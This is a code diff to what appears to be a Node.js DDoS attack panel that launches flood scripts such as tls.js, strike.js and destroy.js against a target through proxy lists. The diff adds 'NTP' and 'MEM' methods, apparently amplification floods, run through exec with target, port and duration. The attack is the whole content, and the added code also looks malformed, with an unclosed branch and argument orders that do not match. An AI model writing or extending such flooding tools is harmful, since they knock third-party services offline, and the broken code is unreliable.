@@ -352,6 +352,15 @@ const metode = path.join(__dirname, `/lib/cache/${methods}`);
           } else if (methods === 'flooder') {
        pushOngoing(target, methods, duration)
 	exec(`node ${metode} ${target} ${duration} 100 100 proxy.txt`)
+	  sigma()
+	  } else if (methods === 'NTP') {
+       pushOngoing(target, methods, duration)
+	exec(`node ${metode} ${target} ${port} 1000`)
+	  sigma()
+	  } else if (methods === 'MEM') {
+       pushOngoing(target, methods, duration)
+	exec(`node ${metode} ${target} ${port} 1000`)
+	  
 const flood = path.join(__dirname, `/lib/cache/flood.js`);
 const tls = path.join(__dirname, `/lib/cache/tls.js`);
 const strike = path.join(__dirname, `/lib/cache/strike.js`);
@@ -363,6 +372,8 @@ const rape = path.join(__dirname, `/lib/cache/rape.js`);
 const storm = path.join(__dirname, `/lib/cache/storm.js`);
 const destroy = path.join(__dirname, `/lib/cache/destroy.js`);
 const flooder = path.join(__dirname, `/lib/cache/flooder.js`);
+const NTP = path.join(__dirname, `NTP`);
+const MEM = path.join(__dirname, `MEM`);
         exec(`node ${flood} ${target} ${duration}`)
         exec(`node ${tls} ${target} ${duration} 100 100`)
         exec(`node ${strike} GET ${target} ${duration} 100 100 proxy.txt`)
@@ -374,6 +385,9 @@ const flooder = path.join(__dirname, `/lib/cache/flooder.js`);
 	exec(`node ${storm} ${target} ${duration} 100 100 proxy.txt`)
 	exec(`node ${destroy} ${target} ${duration} 100 100 proxy.txt`)
 	exec(`node ${flooder} ${target} ${duration} 100 100 proxy.txt`)
+	exec(`node ${NTP} ${target} ${duration} ${port} 1000`)
+	exec(`node ${MEM} ${target} ${duration} ${port} 1000`)
+	  
 	  
           sigma()
           } else {
